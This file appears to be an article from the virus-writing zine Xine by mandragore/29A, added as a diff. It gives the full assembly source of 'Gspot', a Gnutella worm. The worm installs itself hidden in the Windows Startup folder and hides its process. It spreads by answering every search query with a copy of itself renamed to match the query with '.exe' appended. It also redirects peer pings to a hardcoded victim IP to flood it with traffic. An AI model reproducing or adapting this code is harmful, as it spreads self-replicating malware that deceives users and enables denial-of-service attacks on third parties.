@@ -1,0 +1,469 @@
+
+
+                                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+                                             ³ Xine - issue #5 - Phile 215 ³
+                                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+
+
+
+
+comment #
+
+  most of today's file sharing apps are usin a dummy protocol
+  Gnetworks can be easily taken down or abused.
+  this worm is a -basic- proof of concept..
+
+  Gspot acts like a Gnutella client, excepts that it connects automatically 
+  to the local Gnode to reach a Gnetwork, and then catches the search querys. 
+  It reports a result by appending a '.exe' to the search criteria. 
+  Its file server is running on port 99.
+  A lil payload is included.. It replyes to 'G-pings' by a www's IP.
+  This could cause -heavy- traffic on that target if this worm spreads well.
+  Tested with Gnutella v0.56 .
+
+  more to come later :))
+
+
+
+                                             -><- mandragore / 29A -><-
+
+#
+
+
+include gspot.inc
+
+.data
+
+;  main thread
+lsin    saddr <2,6300h,0,0>
+        org $-4
+threads dd ?
+
+lsock   dd ?
+
+rkey    db 'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',0
+rskey   db 'Startup',0
+
+;  thread 1
+rpacket  _result <>
+         db 300 dup(?)
+csock    dd ?
+csin     saddr <2,0CA18h,0,0>
+conask   db 'GNUTELLA CONNECT/0.4',10,10
+conasksz equ $-conask
+conget   db 'GNUTELLA OK',10,10
+congetsz equ $-conget
+recvd    db 200 dup(?)
+
+;  thread 2
+ssock   dd ?
+hndl    dd ?
+fsz     dd ?
+httpreq db 100 dup(?)
+httphd  db 'HTTP 200 OK',13,10
+        db 'Server: Gnutella',13,10
+        db 'Content-type:application/binary',13,10
+        db 'Content-length:'
+spotsize db 24 dup(?)
+
+eodseg:
+
+.code
+
+;===============================  core  -------------------------------------
+
+Start:
+        push off lsock
+        push off rkey
+        push 80000001h
+        callw RegOpenKeyA
+        or eax,eax
+        jnz __bye
+
+        mov threads,500
+        push off threads
+        push off eodseg
+        push off rkey
+        push 0
+        push off rskey
+        push lsock
+        callw RegQueryValueExA          ;  get Startup folder
+
+        push lsock
+        callw RegCloseKey
+
+        lea esi,eodseg
+        mov ebp,esi
+        lodsb
+        cmp al,0
+        jne $-3
+        xchg edi,esi
+        dec edi
+        mov eax,'psG\'
+        stosd
+        mov eax,'e.to'
+        stosd
+        mov eax,00006578h
+        stosd
+                push 0
+                push ebp
+                push edi
+
+        push 400
+        push edi
+        push 0
+        callw GetModuleFileNameA
+
+                callw CopyFileA         ;  copy file
+                or eax,eax
+                jz __installed          ;  already exists ? then run worm
+
+        push 6
+        push ebp
+        callw SetFileAttributesA        ;  attrib +hs, then leave
+        jmp __bye
+
+__installed:
+        mov ecx,cs
+        or ch,ch
+        jz __nt         ;  if NT then skip
+
+        call $+14
+        db 'kernel32',0
+        callw GetModuleHandleA
+        call $+28
+        db 'RegisterServiceProcess',0   ;...
+        push eax
+        callw GetProcAddress
+        mov edx,eax
+        callw GetCurrentProcessId
+        push 1
+        push eax
+        call edx
+
+__nt:
+        push off eodseg
+        push 101h
+        callw WSAStartup
+        inc eax
+        jz __bye
+
+        push off threads
+        push 0
+        push 0
+        push off connex
+        push 0
+        push 0
+        callw CreateThread      ;  fork the thread for outgoing connection
+
+        push 6
+        push 1
+        push 2
+        callw socket
+        mov lsock,eax
+
+        push 16
+        push off lsin
+        push lsock
+        callw bind
+        inc eax
+        jz __bye        ;  error handling + 'residency' checking
+
+__sniff:
+        push 10
+        push lsock
+        callw listen
+
+        push 0
+        push 0
+        push lsock
+        callw accept
+        
+        push off threads
+        push 0
+        push eax                ;  new socket as arg
+        push off propag
+        push 0
+        push 0
+        callw CreateThread      ;  fork to handle incoming connex
+
+        cdq
+        dec edx
+        push edx
+        push eax
+        callw WaitForSingleObject
+
+        jmp __sniff
+
+__bye:  callw WSACleanup
+        push 0
+        callw ExitProcess
+
+
+sig     db '[Gspot 1]',0,'freely shared by mandragore/29A',0
+
+;-----------------------------   outgoing connex
+
+connex:
+        call __getip
+        mov csin.sip,eax        ;  local Gnode
+
+        push 10000
+        callw Sleep     ;  don't hammer
+
+        push csock
+        callw closesocket
+
+        push 6
+        push 1
+        push 2
+        callw socket
+        mov csock,eax
+
+        push 16
+        push off csin
+        push eax
+        callw connect
+        inc eax
+        jz connex
+
+        push 0
+        push conasksz
+        push off conask
+        push csock
+        callw send
+
+        push 0
+        push 100
+        push off recvd
+        push csock
+        callw recv
+        or eax,eax
+        jz connex
+        inc eax
+        jz connex
+        
+        lea esi,conget
+        lea edi,recvd
+        mov ecx,congetsz
+        repz cmpsb              ;  connection granted ?
+        jecxz $+7
+        jmp connex
+
+__sniff:
+        push 0
+        push 100
+        push off recvd
+        push csock
+        callw recv
+        or eax,eax
+        jz connex
+        inc eax
+        jz connex
+
+        cmp bptr [recvd.func],0
+        je __payload
+;        cmp bptr [recvd.func],40h      ;  to come :)
+;        je
+        cmp bptr [recvd.func],80h       ;  search request ?
+        jne __sniff
+
+        lea esi,recvd
+        lea edi,rpacket
+        mov ecx,16
+        rep movsb               ;  msg ID
+        mov eax,00000781h
+        stosd                   ;  query_hit, ttl 7, hops 0
+        dec edi
+        lea esi,[recvd.stringz]
+        mov ecx,esi
+        lodsb
+        cmp al,0
+        jne $-3
+        cmp bptr [esi],0
+        jne $-8
+        sub esi,ecx
+        xchg esi,ecx
+        dec ecx
+                push ecx        ;  size of request string
+        mov eax,ecx
+        add eax,41 ; 1+2+4+4+4+4+4+2+16
+        stosd                   ;  size of datas
+
+        mov eax,00006301h       ;  1 matching result, port 99
+        stosd
+        dec edi
+
+        call __getip
+        stosd
+
+        mov eax,00000200h       ;  512k as bandwidth
+        stosd
+
+        xor eax,eax
+        stosd                   ;  index
+
+        push 400
+        push off eodseg
+        push 0
+        callw GetModuleFileNameA
+        push 0
+        push off eodseg
+        callw _lopen
+        push eax
+        push 0
+        push eax
+        callw GetFileSize
+        mov ebp,eax
+        stosd                   ;  filesize in bytes
+        callw _lclose
+        cmp ebp,-1
+        je __sniff
+                pop ecx
+        rep movsb               ;  search criteria
+        mov eax,'exe.'
+        stosd                   ;  + ".exe"
+        xchg eax,ecx
+        stosw                   ;  null null
+        mov eax,1DeadFedh
+        stosd
+        stosd                   ;  the client ID of Gspot
+        stosd
+        stosd
+
+__forkpacket:
+        push 0
+        mov eax,[rpacket.resz]
+        add eax,gheadsz+4
+        push eax
+        push off rpacket
+        push csock
+        callw send
+
+        lea edi,recvd
+        mov ecx,size recvd /4
+        xor eax,eax
+        rep stosd
+
+        jmp __sniff
+
+__getip:
+        push esi
+        push 150
+        push off eodseg
+        callw gethostname
+        push off eodseg
+        callw gethostbyname
+        mov esi,[eax.ptrAddr]
+        lodsd
+        cmp bptr [esi],0
+        jne $-4
+        mov eax,[eax]           ;  ip of the last interface
+        pop esi
+        ret
+
+__payload:
+        lea esi,recvd
+        lea edi,rpacket
+        mov ecx,16
+        rep movsb               ;  msg ID
+        mov eax,0000ff01h
+        stosd                   ;  pong
+        dec edi
+        mov eax,14
+        stosd
+        mov ax,0050h            ;  port 80
+        stosw
+        mov eax,50C2E140h       ;  put your favorite IP here :))
+        stosd
+        mov eax,20
+        stosd
+        stosd
+        jmp __forkpacket
+
+;----------------------------  file propagation
+
+propag:
+        pop eax
+        pop [ssock]
+        
+        push 0
+        push 100
+        push off httpreq
+        push ssock
+        callw recv
+
+        push 400
+        push off eodseg
+        push 0
+        callw GetModuleFileNameA
+        push 0
+        push off eodseg
+        callw _lopen
+        mov hndl,eax
+        push 0
+        push eax
+        callw GetFileSize       ;  ... get our size
+        mov fsz,eax
+
+        ; eax holds the filesize
+        lea edi,spotsize       ;  ptrStr
+	mov ebx,10             ;  radix
+        sub esp,24h
+        mov esi,esp
+        xor edx,edx
+	div ebx
+	mov [esi],dl
+	inc esi
+	or eax,eax             ;  I mostly ripped this rutine from APJ #1
+	jnz $-9                ;        heya mammoth
+        dec esi
+	mov al,[esi]            ;  Computes the ascii file size for
+	cmp al,10               ;   the http header
+	jl $+4
+	add al,cl
+        add al,'0'
+	stosb
+	cmp esi,esp
+	jg $-14
+        add esp,24h
+
+        mov eax,0a0d0a0dh
+        stosd
+
+        lea esi,httphd
+        sub edi,esi
+        push 0
+        push edi
+        push esi
+        push ssock
+        callw send               ;  send the pseudo HTTP/1.0 header
+
+        push fsz
+        push 0
+        callw GlobalAlloc
+        mov ebx,eax
+        push fsz
+        push eax                ;  read the file to a dyn buffer
+        push hndl               ;  small enough to not have to map the file
+        callw _lread
+        push hndl
+        callw _lclose
+
+        push 0
+        push fsz
+        push ebx
+        push ssock
+        callw send
+        
+        push ebx
+        callw GlobalFree
+        
+        push ssock
+        callw closesocket
+
+__bye:  push 0
+        callw ExitThread
+
+end Start
